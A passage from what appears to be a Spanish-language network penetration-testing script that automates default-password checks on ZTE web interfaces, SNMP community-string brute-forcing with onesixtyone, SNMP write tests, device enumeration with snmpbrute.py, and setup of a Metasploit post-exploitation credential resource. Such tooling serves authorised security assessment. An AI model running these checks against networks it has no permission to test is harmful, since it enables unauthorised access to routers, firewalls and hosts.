		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando HTTP \n $RESET"	
			echo "user" > pass.txt
			passWeb.pl -t $ip -p 80 -d / -m zte -u user -f pass.txt  > logs/vulnerabilidades/$ip-web-ZTE.txt 2>/dev/null
			grep "Password encontrado" logs/vulnerabilidades/$ip-web-ZTE.txt > .vulnerabilidades/$ip-zte:80-passwordDefecto.txt 2>/dev/null
		fi					
						
		echo ""
 	done <.servicios/ZTE.txt
	
	insert_data
fi

cat .servicios/snmp2.txt .servicios/linksys.txt .servicios/Netgear.txt .servicios/pfsense.txt .servicios/ubiquiti.txt .servicios/mikrotik.txt .servicios/NetScreen.txt  .servicios/fortinet.txt .servicios/cisco.txt  .servicios/ciscoASA.txt .servicios/3com.txt 2>/dev/null | sort | uniq > .servicios/snmp.txt; rm .servicios/snmp2.txt  2>/dev/null

find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacios

if [ -f .servicios/snmp.txt ]
then
	echo -e "$OKBLUE #################### SNMP (`wc -l .servicios/snmp.txt`) ######################$RESET"	    
	
	echo -e "[+] Escaneando $ip"
	echo -e "\t[+] Probando comunity string comunes"
	onesixtyone -c /usr/share/lanscanner/community.txt -i .servicios/snmp.txt > .enumeracion2/dispositivos-snmp2.txt
	sed 's/] 1/] \n1/g' -i .enumeracion2/dispositivos-snmp2.txt	# corregir error de onesixtyone
	cat .enumeracion2/dispositivos-snmp2.txt | grep --color=never "\[" | sed 's/ \[/~/g' |  sed 's/\] /~/g' | sort | sort | uniq > .enumeracion2/dispositivos-snmp.txt
	

	while read line; do
		ip=`echo $line | cut -f1 -d"~"`
		community=`echo $line | cut -f2 -d"~"`
		device=`echo $line | cut -f3 -d"~"`
		
		echo -e "\t[i] Dispositivo identificado: $device"
		echo -e "\t[+] Enumerando con el comunity string: $community"
		### snmp write ##
		snmp-write.pl -t $ip -c $community >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null
		echo "" >>	logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null
				
		### snmp bruteforce ##				
		
		if [[ ${device} == *"windows"*  ]];then 			
			echo -e "\t\t[+] Enumerando como dispositivo windows"
			snmpbrute.py -t $ip --windows --auto >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null 
		fi									
			
		if [[ (${device} == *"linux"* || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
			echo -e "\t\t[+] Enumerando como dispositivo Linux" 
			snmpbrute.py -t $ip --linux --auto >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null 
		fi										
			
		egrep -qi "HOSTNAME" logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo ""	# Ya fue enumerado
		else
			echo -e "\t\t[+] Enumerando como dispositivo cisco" 			
			snmpbrute.py -t $ip --cisco --auto >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null 
		fi		
		
		
		###### Revisar si no es impresora ######
		egrep -qi "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKGREEN[i] Es una impresora $RESET"
			rm logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt
		else
			echo -e "\t$OKRED[!] Enumeración SNMP realizada \n $RESET"
			cp logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt .vulnerabilidades/$ip-snmp-snmpCommunity.txt	
		fi		
		#######################						
		
	done <.enumeracion2/dispositivos-snmp.txt
#	rm banners-snmp2.txt
	
	insert_data
	##################################
fi


echo "spool `pwd`/metasploit/IP-creds.txt" > command-metasploit.txt
echo "resource /usr/share/lanscanner/postExploiter/creds.rc" >> command-metasploit.txt

echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
grep -ira "timed out" * logs/enumeracion/* 2>/dev/null
grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null
